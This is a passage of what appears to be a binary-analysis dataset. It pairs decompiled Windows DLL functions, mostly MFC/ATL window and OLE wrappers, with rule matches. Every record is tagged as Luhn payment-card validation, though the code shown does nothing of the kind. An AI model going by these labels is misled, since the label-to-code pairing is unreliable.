        "decompiled_code": "\nuint64_t fcn.180015c20(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    ulong in_R9;\n    ulong uStack16;\n    \n    uStack16 = 0;\n    iVar4 = fcn.180014058();\n    uVar5 = fcn.180013598(*(iVar4 + 0xd8), &uStack16);\n    iVar1 = uVar5;\n    if (iVar1 != 0) {\n        uVar2 = (*_sym.imp.USER32.dll_GetClassInfoW)(arg1, arg2, arg3, in_R9, 0);\n        uVar5 = uVar2;\n        if (iVar1 != 2) {\n            if (uVar2 != 0) {\n                uVar3 = 0;\n            }\n            else {\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            fcn.18001357c(0, uStack16);\n            if (uVar2 == 0) {\n                (*_sym.imp.KERNEL32.dll_SetLastError)(uVar3);\n            }\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 285
    },
    "180015cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint64_t fcn.180015ccc(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    ulong in_R9;\n    ulong uStack16;\n    \n    uStack16 = 0;\n    iVar4 = fcn.180014058();\n    uVar5 = fcn.180013598(*(iVar4 + 0xd8), &uStack16);\n    iVar1 = uVar5;\n    if (iVar1 != 0) {\n        uVar2 = (*_sym.imp.USER32.dll_GetClassInfoExW)(arg1, arg2, arg3, in_R9, 0);\n        uVar5 = uVar2;\n        if (iVar1 != 2) {\n            if (uVar2 != 0) {\n                uVar3 = 0;\n            }\n            else {\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            fcn.18001357c(0, uStack16);\n            if (uVar2 == 0) {\n                (*_sym.imp.KERNEL32.dll_SetLastError)(uVar3);\n            }\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 285
    },
    "180015ea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint64_t fcn.180015ea4(ulong arg1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int64_t iVar3;\n    ulong in_R8;\n    ulong in_R9;\n    ulong uStackX24;\n    int64_t iVar4;\n    \n    uStackX24 = 0;\n    iVar3 = fcn.180014058();\n    iVar1 = fcn.180013598(*(iVar3 + 0xd8), &uStackX24);\n    if (iVar1 == 0) {\n        iVar3 = 0;\n    }\n    else {\n        iVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(arg1);\n        if (iVar1 != 2) {\n            iVar4 = iVar3;\n            if (iVar3 != 0) {\n                uVar2 = 0;\n            }\n            else {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            fcn.18001357c(0, uStackX24, in_R8, in_R9, iVar4);\n            if (iVar3 == 0) {\n                (*_sym.imp.KERNEL32.dll_SetLastError)(uVar2);\n            }\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 273
    },
    "18001757": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint fcn.180017570(int64_t *arg1, uint64_t arg2)\n\n{\n    bool bVar1;\n    bool bVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    int64_t arg1_00;\n    int64_t iVar6;\n    int32_t iVar7;\n    \n    iVar7 = 0;\n    bVar1 = true;\n    bVar2 = true;\n    if (((arg2 & 4) == 0) || (uVar3 = fcn.18001bd28(arg1),  (uVar3 >> 0x1c & 1) != 0)) {\n        bVar1 = false;\n    }\n    iVar5 = (*_sym.imp.USER32.dll_GetParent)();\n    *(arg1 + 0xf) = *(arg1 + 0xf) | 0x18;\n    arg1_00 = fcn.180010ae8();\ncode_r0x00018001764d:\n    while ((!bVar2 || (iVar4 = (*_sym.imp.USER32.dll_PeekMessageW)(arg1_00, 0, 0, 0, 0),  iVar4 != 0))) {\n        do {\n            iVar4 = fcn.18001108c();\n            if (iVar4 == 0) {\n                fcn.18000db00(0);\n                return 0xffffffff;\n            }\n            if ((bVar1) && ((*(arg1_00 + 8) == 0x118 || (*(arg1_00 + 8) == 0x104)))) {\n                fcn.18001be78(arg1, 1);\n                (*_sym.imp.USER32.dll_UpdateWindow)(arg1[8]);\n                bVar1 = false;\n            }\n            iVar4 = (**(*arg1 + 0x110))(arg1);\n            if (iVar4 == 0) {\n                *(arg1 + 0xf) = *(arg1 + 0xf) & 0xffffffe7;\n                return *(arg1 + 0x11);\n            }\n            iVar4 = fcn.180010f44(arg1_00);\n            if (iVar4 != 0) {\n                iVar7 = 0;\n                bVar2 = true;\n            }\n            iVar4 = (*_sym.imp.USER32.dll_PeekMessageW)();\n        } while (iVar4 != 0);\n    }\n    if (bVar1) {\n        fcn.18001be78(arg1, 1);\n        (*_sym.imp.USER32.dll_UpdateWindow)();\n        bVar1 = false;\n    }\n    if ((((arg2 & 1) == 0) && (iVar5 != 0)) && (iVar7 == 0)) {\n        (*_sym.imp.USER32.dll_SendMessageW)();\n    }\n    if ((arg2 & 2) == 0) goto code_r0x00018001762e;\n    goto code_r0x00018001764b;\ncode_r0x00018001762e:\n    iVar6 = (*_sym.imp.USER32.dll_SendMessageW)();\n    iVar7 = iVar7 + 1;\n    if (iVar6 == 0) {\ncode_r0x00018001764b:\n        bVar2 = false;\n    }\n    goto code_r0x00018001764d;\n}\n",
        "token_count": 728
    },
    "1800178e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint64_t fcn.1800178ec(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    ulong in_R8;\n    ulong in_R9;\n    code *pcVar6;\n    bool bVar7;\n    ulong uStackX32;\n    uchar auStack16 [8];\n    \n    uStackX32 = 0;\n    iVar4 = fcn.180014058();\n    uVar5 = fcn.180013598(*(iVar4 + 0xd8), &uStackX32);\n    iVar1 = uVar5;\n    if (iVar1 != 0) {\n        fcn.180017878(arg1, auStack16);\n        pcVar6 = *(arg1 + 0x28);\n        if (pcVar6 == NULL) {\n            fcn.180012514();\n        }\n        uVar2 = (*pcVar6)(arg2);\n        uVar5 = uVar2;\n        if (iVar1 != 2) {\n            bVar7 = uVar2 != 0;\n            if (bVar7) {\n                uVar3 = 0;\n            }\n            else {\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            fcn.18001357c(0, uStackX32, in_R8, in_R9, uVar2);\n            if (!bVar7) {\n                (*_sym.imp.KERNEL32.dll_SetLastError)(uVar3);\n            }\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 359
    },
    "180017a1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint64_t fcn.180017a14(int64_t arg1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    ulong in_R8;\n    ulong in_R9;\n    code *pcVar6;\n    bool bVar7;\n    ulong uStackX24;\n    uchar auStackX32 [8];\n    \n    uStackX24 = 0;\n    iVar4 = fcn.180014058();\n    uVar5 = fcn.180013598(*(iVar4 + 0xd8), &uStackX24);\n    iVar1 = uVar5;\n    if (iVar1 != 0) {\n        fcn.1800179a0(arg1, auStackX32);\n        pcVar6 = *(arg1 + 0x20);\n        if (pcVar6 == NULL) {\n            fcn.180012514();\n        }\n        uVar2 = (*pcVar6)();\n        uVar5 = uVar2;\n        if (iVar1 != 2) {\n            bVar7 = uVar2 != 0;\n            if (bVar7) {\n                uVar3 = 0;\n            }\n            else {\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            fcn.18001357c(0, uStackX24, in_R8, in_R9, uVar2);\n            if (!bVar7) {\n                (*_sym.imp.KERNEL32.dll_SetLastError)(uVar3);\n            }\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 356
    },
    "18001818": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.180018180(int64_t *arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    \n    iVar2 = fcn.180028cec(0x180069c00, 0x180010dc0);\n    if (iVar2 == 0) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    (**(*arg1 + 0x240))(arg1, *(iVar2 + 0xa0), *(iVar2 + 0xa8), *(iVar2 + 0xb0), arg2);\n    return;\n}\n",
        "token_count": 148
    },
    "18001855": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.18001855c(int64_t *arg1, int32_t *arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    ulong arg1_00;\n    int64_t hWnd;\n    int32_t iStack24;\n    int32_t iStack20;\n    \n    if (((((arg3 >> 0x1c & 1) == 0) && (uVar2 = fcn.18001bd28(arg1),  (uVar2 & 0x50000000) == 0)) &&\n        ((*_sym.imp.USER32.dll_GetWindowRect)(arg1[8], &iStack24),  *arg2 == iStack24)) && (arg2[1] == iStack20)) {\n        arg1_00 = (*_sym.imp.USER32.dll_GetWindow)(arg1[8]);\n        hWnd = fcn.180017c38(arg1_00);\n        if (((hWnd == 0) || (iVar1 = fcn.18001bea8(hWnd),  iVar1 == 0)) &&\n           (iVar1 = (**(*arg1 + 0x248))(arg1),  iVar1 != 0)) {\n            fcn.180017318(arg1, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 286
    },
    "180018a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.180018a08(ulong hWnd, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t arg1;\n    int64_t iVar1;\n    int32_t in_stack_00000028;\n    int32_t in_stack_00000030;\n    \n    for (arg1 = (*_sym.imp.USER32.dll_GetTopWindow)(); arg1 != 0; arg1 = (*_sym.imp.USER32.dll_GetWindow)(arg1)) {\n        if (in_stack_00000030 == 0) {\n            (*_sym.imp.USER32.dll_SendMessageW)();\n        }\n        else {\n            iVar1 = fcn.180017c7c(arg1);\n            if (iVar1 != 0) {\n                fcn.1800185f4(iVar1, *(iVar1 + 0x40), arg2, arg3);\n            }\n        }\n        if ((in_stack_00000028 != 0) && (iVar1 = (*_sym.imp.USER32.dll_GetTopWindow)(arg1),  iVar1 != 0)) {\n            fcn.180018a08(arg1, arg2, arg3, arg4);\n        }\n    }\n    return;\n}\n",
        "token_count": 260
    },
    "180019a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.180019a08(int64_t arg1, ulong arg2, int64_t arg3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    ulong uStack24;\n    ulong uStack16;\n    \n    uVar1 = fcn.18001bd28(arg1);\n    if (((uVar1 >> 0x1e & 1) == 0) && (iVar3 = fcn.180019674(arg1),  iVar3 != 0)) {\n        if ((arg3 != 0) &&\n           ((iVar2 = (*_sym.imp.USER32.dll_IsWindow)(*(arg3 + 0x40)),  iVar2 != 0 &&\n            (iVar4 = fcn.180019674(arg3),  iVar3 == iVar4)))) {\n            return;\n        }\n        uStack24 = *(arg1 + 0x40);\n        if (arg3 == 0) {\n            uStack16 = 0;\n        }\n        else {\n            uStack16 = *(arg3 + 0x40);\n        }\n        (*_sym.imp.USER32.dll_SendMessageW)(*(iVar3 + 0x40), 0x36e, arg2, &uStack24);\n    }\n    return;\n}\n",
        "token_count": 287
    },
    "18001a17": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.18001a17c(int64_t *arg1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint uVar4;\n    uint uVar5;\n    \n    iVar2 = (**(*arg1 + 0x250))();\n    if (iVar2 != 0) {\n        (**(*arg1 + 0x310))(arg1);\n    }\n    (*_sym.imp.USER32.dll_SendMessageW)(arg1[8]);\n    fcn.180018a08(arg1[8], 0x1f, 0, 0);\n    iVar3 = fcn.180019674(arg1);\n    if (iVar3 == 0) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    (*_sym.imp.USER32.dll_SendMessageW)(*(iVar3 + 0x40));\n    uVar5 = 1;\n    uVar4 = 1;\n    fcn.180018a08(*(iVar3 + 0x40), 0x1f, 0, 0);\n    iVar3 = (*_sym.imp.USER32.dll_GetCapture)();\n    if (iVar3 != 0) {\n        (*_sym.imp.USER32.dll_SendMessageW)(iVar3, 0x1f, 0, 0, uVar4, uVar5);\n    }\n    return;\n}\n",
        "token_count": 318
    },
    "18001c40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint64_t fcn.18001c408(int64_t hWnd, ulong arg2, ulong arg3)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    int64_t *piVar6;\n    ulong in_R9;\n    int64_t iStackX8;\n    \n    if (*(hWnd + 0xa0) == 0) {\n        uVar5 = (*_sym.imp.USER32.dll_GetWindowTextW)(*(hWnd + 0x40), arg2, arg3, in_R9, 0xfffffffffffffffe);\n    }\n    else {\n        piVar6 = fcn.180012330();\n        if (piVar6 == NULL) {\n            fcn.180001214(0x80004005);\n            pcVar2 = swi(3);\n            uVar5 = (*pcVar2)();\n            return uVar5;\n        }\n        iStackX8 = (**(*piVar6 + 0x18))(piVar6);\n        iStackX8 = iStackX8 + 0x18;\n        (**(**(hWnd + 0xa0) + 0x118))(*(hWnd + 0xa0), &iStackX8);\n        iVar3 = fcn.180036208(arg2, arg3, iStackX8, 0xffffffffffffffff);\n        if (iVar3 != 0) {\n            if (iVar3 == 0xc) {\n                fcn.1800124cc();\n                pcVar2 = swi(3);\n                uVar5 = (*pcVar2)();\n                return uVar5;\n            }\n            if ((iVar3 == 0x16) || (iVar3 == 0x22)) {\n                fcn.180012514();\n                pcVar2 = swi(3);\n                uVar5 = (*pcVar2)();\n                return uVar5;\n            }\n            if (iVar3 != 0x50) {\n                fcn.180012514();\n                pcVar2 = swi(3);\n                uVar5 = (*pcVar2)();\n                return uVar5;\n            }\n        }\n        uVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n        uVar5 = uVar4;\n        LOCK();\n        piVar1 = iStackX8 + -8;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        if (iVar3 + -1 < 1) {\n            (**(**(iStackX8 + -0x18) + 8))();\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 585
    },
    "18001c6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.18001c6c0(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    int64_t *arg1_00;\n    int64_t iVar2;\n    code *pcVar3;\n    bool bVar4;\n    uint32_t uVar5;\n    int64_t *piVar6;\n    uint64_t uVar7;\n    uchar auStack24 [16];\n    \n    iVar1 = *arg1;\n    piVar6 = arg1[1];\n    bVar4 = false;\n    do {\n        if (((piVar6 == NULL) || (piVar6 = *piVar6,  piVar6 == NULL)) ||\n           (uVar5 = fcn.18001bfac(piVar6[2]),  (uVar5 >> 0x11 & 1) != 0)) {\n            piVar6 = fcn.18001c50c(arg1, auStack24);\n            if (iVar1 != *piVar6) {\n                fcn.180012514();\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n            piVar6 = piVar6[1];\n            if (piVar6 == NULL) {\n                return;\n            }\n            if (bVar4) {\n                return;\n            }\n            bVar4 = true;\n        }\n        arg1_00 = piVar6[2];\n        iVar2 = *arg1_00;\n        if (((iVar2 == 0) || (uVar7 = (*_sym.imp.USER32.dll_SendMessageW)(iVar2, 0x87, 0, 0),  (uVar7 >> 8 & 1) == 0))\n           && ((uVar5 = fcn.18001bfac(arg1_00),  (uVar5 >> 0x1c & 1) != 0 && ((uVar5 >> 0x1b & 1) == 0)))) {\n            if (*arg1 == iVar1) {\n                arg1[1] = piVar6;\n                return;\n            }\n            fcn.180012514();\n            pcVar3 = swi(3);\n            (*pcVar3)();\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 490
    },
    "18001c79": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.18001c790(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    code *pcVar3;\n    bool bVar4;\n    uint32_t uVar5;\n    int64_t *piVar6;\n    uint64_t uVar7;\n    int64_t iVar8;\n    uchar auStack24 [16];\n    \n    iVar1 = *arg1;\n    iVar8 = arg1[1];\n    bVar4 = false;\n    do {\n        if (iVar8 == 0) goto code_r0x00018001c7d0;\n        uVar5 = fcn.18001bfac(*(iVar8 + 0x10));\n        if ((uVar5 >> 0x11 & 1) != 0) goto code_r0x00018001c7d0;\n        iVar8 = *(iVar8 + 8);\n        while (iVar8 == 0) {\ncode_r0x00018001c7d0:\n            piVar6 = fcn.18001c578(arg1, auStack24);\n            if (iVar1 != *piVar6) {\n                fcn.180012514();\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n            iVar8 = piVar6[1];\n            if (iVar8 == 0) {\n                return;\n            }\n            if (bVar4) {\n                return;\n            }\n            bVar4 = true;\n        }\n        piVar6 = *(iVar8 + 0x10);\n        iVar2 = *piVar6;\n        if ((((iVar2 == 0) || (uVar7 = (*_sym.imp.USER32.dll_SendMessageW)(iVar2, 0x87, 0, 0),  (uVar7 >> 8 & 1) == 0))\n            && (uVar5 = fcn.18001bfac(piVar6),  (uVar5 >> 0x1c & 1) != 0)) && ((uVar5 >> 0x1b & 1) == 0)) {\n            if (*arg1 == iVar1) {\n                arg1[1] = iVar8;\n                return;\n            }\n            fcn.180012514();\n            pcVar3 = swi(3);\n            (*pcVar3)();\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 524
    },
    "18001c86": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong fcn.18001c864(int64_t arg1, int64_t arg2)\n\n{\n    int64_t iStack24;\n    int64_t iStack16;\n    \n    if (*(arg1 + 0x98) != 0) {\n        if (arg2 == 0) {\n            iStack16 = fcn.18001c630(arg1);\n        }\n        else {\n            iStack16 = fcn.18001c600(arg1, arg2);\n        }\n        if (iStack16 != 0) {\n            iStack24 = *(arg1 + 0x98) + 0x80;\n            fcn.18001c790(&iStack24);\n            if (iStack16 != 0) {\n                return *(iStack16 + 0x10);\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 184
    },
    "18001c8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong fcn.18001c8c8(int64_t arg1, int64_t arg2)\n\n{\n    int64_t iStack24;\n    int64_t iStack16;\n    \n    if (*(arg1 + 0x98) != 0) {\n        if (arg2 == 0) {\n            iStack16 = fcn.18001c630(arg1);\n        }\n        else {\n            iStack16 = fcn.18001c600(arg1, arg2);\n        }\n        if (iStack16 != 0) {\n            iStack24 = *(arg1 + 0x98) + 0x80;\n            fcn.18001c6c0(&iStack24);\n            if (iStack16 != 0) {\n                return *(iStack16 + 0x10);\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 188
    },
    "18001cd4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint64_t fcn.18001cd40(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    ulong uVar3;\n    ulong auStackX16 [3];\n    uchar auStack24 [16];\n    \n    auStackX16[0] = arg2;\n    (*_sym.imp.USER32.dll_ClientToScreen)(arg1, auStackX16);\n    uVar3 = 5;\n    do {\n        arg1 = (*_sym.imp.USER32.dll_GetWindow)(arg1, uVar3);\n        if (arg1 == 0) {\n            return 0;\n        }\n        iVar1 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(arg1);\n        if ((iVar1 != 0xffff) &&\n           (uVar2 = (*_sym.imp.USER32.dll_GetWindowLongW)(arg1, 0xfffffff0),  (uVar2 >> 0x1c & 1) != 0)) {\n            (*_sym.imp.USER32.dll_GetWindowRect)(arg1, auStack24);\n            iVar1 = (*_sym.imp.USER32.dll_PtInRect)(auStack24, auStackX16[0]);\n            if (iVar1 != 0) {\n                return arg1;\n            }\n        }\n        uVar3 = 2;\n    } while( true );\n}\n",
        "token_count": 299
    },
    "18001d3d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong fcn.18001d3dc(int16_t *arg1, ulong *arg2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    ulong uVar4;\n    int16_t iStack24;\n    int16_t iStack22;\n    int16_t iStack18;\n    int16_t iStack16;\n    int16_t iStack14;\n    int16_t iStack12;\n    \n    uVar3 = 0;\n    uVar4 = 0;\n    if (arg2 == NULL) {\n        fcn.180001214(0x80004005);\n        pcVar1 = swi(3);\n        uVar3 = (*pcVar1)();\n        return uVar3;\n    }\n    iVar2 = (*_sym.imp.OLEAUT32.dll_VariantTimeToSystemTime)();\n    fcn.180033c90(&iStack24, 0, 0x10);\n    if (iVar2 != 0) {\n        iVar2 = (*_sym.imp.OLEAUT32.dll_UnRegisterTypeLib)(*arg2);\n        if ((((iVar2 != 0) && (*arg1 == iStack24)) && (uVar3 = uVar4,  arg1[1] == iStack22)) &&\n           (((arg1[3] == iStack18 && (arg1[4] == iStack16)) && ((arg1[5] == iStack14 && (arg1[6] == iStack12)))))) {\n            uVar3 = 1;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 344
    },
    "18001d6a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint32_t fcn.18001d6a8(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    ushort uStack24;\n    ushort uStack22;\n    ushort uStack18;\n    \n    fcn.180033c90(&uStack24, 0, 0x10);\n    uStack24 = arg2;\n    uStack22 = arg3;\n    uStack18 = arg4;\n    iVar1 = fcn.18001d3dc(&uStack24, arg1);\n    *(arg1 + 8) = iVar1 == 0;\n    return iVar1 == 0;\n}\n",
        "token_count": 147
    },
    "18001d82": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.18001d82c(int64_t arg1, ulong noname_1, ulong arg3, int64_t arg4)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint64_t arg2;\n    uint32_t auStack24 [2];\n    ulong uStack16;\n    \n    if (arg3 == 0) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    auStack24[0] = arg3;\n    fcn.18001d770(arg1, noname_1, 1, auStack24);\n    if (arg4 != 0) {\n        uVar2 = (*_sym.imp.OLEAUT32.dll_SafeArrayUnaccessData)();\n        fcn.18001d2a4(uVar2);\n        uVar2 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetUBound)(*(arg1 + 8));\n        arg2 = uVar2 * arg3;\n        if (0x7fffffff < arg2) {\n            fcn.180012514();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        iVar3 = fcn.180034220(uStack16, arg2, arg4, arg2);\n        if (iVar3 != 0) {\n            if (iVar3 == 0xc) {\n                fcn.1800124cc();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            if ((iVar3 == 0x16) || (iVar3 == 0x22)) {\n                fcn.180012514();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            if (iVar3 != 0x50) {\n                fcn.180012514();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        uVar2 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetElement)();\n        fcn.18001d2a4(uVar2);\n    }\n    return;\n}\n",
        "token_count": 485
    },
    "18001d9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint64_t * fcn.18001d9cc(int64_t *arg1, uint64_t arg2, int64_t *psa)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int64_t *piVar3;\n    int64_t iVar4;\n    \n    if (psa == NULL) {\n        fcn.180001214(0x80004005);\n        pcVar1 = swi(3);\n        piVar3 = (*pcVar1)();\n        return piVar3;\n    }\n    iVar4 = (**(*psa + 0x18))(psa);\n    *arg1 = iVar4 + 0x18;\n    if (arg2 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        if ((arg2 & 0xffffffffffff0000) == 0) {\n            iVar4 = fcn.18001231c(arg2 & 0xffff);\n            if (iVar4 == 0) {\n                return arg1;\n            }\n            fcn.180008b80(arg1, iVar4, arg2 & 0xffff);\n            return arg1;\n        }\n        uVar2 = fcn.180033b84(arg2);\n    }\n    fcn.180008dfc(arg1, arg2, uVar2);\n    return arg1;\n}\n",
        "token_count": 292
    },
    "18001da6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.18001da68(code **arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.180012330();\n    *arg1 = vtable.ATL::CFixedStringMgr.0;\n    arg1[1] = pcVar1;\n    arg1[2] = arg1 + 4;\n    *(arg1 + 6) = 0xffffffff;\n    *(arg1[2] + 8) = 0;\n    *(arg1[2] + 0xc) = 0x100;\n    *arg1[2] = arg1;\n    *(arg1[2] + 0x18) = 0;\n    fcn.18001d9cc(arg1 + 3, arg2, arg1);\n    *arg1 = \n    vtable.ATL::CFixedStringT_class_ATL::CStringT_wchar_t__class_StrTraitMFC_wchar_t__class_ATL::ChTraitsCRT_wchar_t_____256_.0\n    ;\n    return arg1;\n}\n",
        "token_count": 236
    },
    "18001db8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
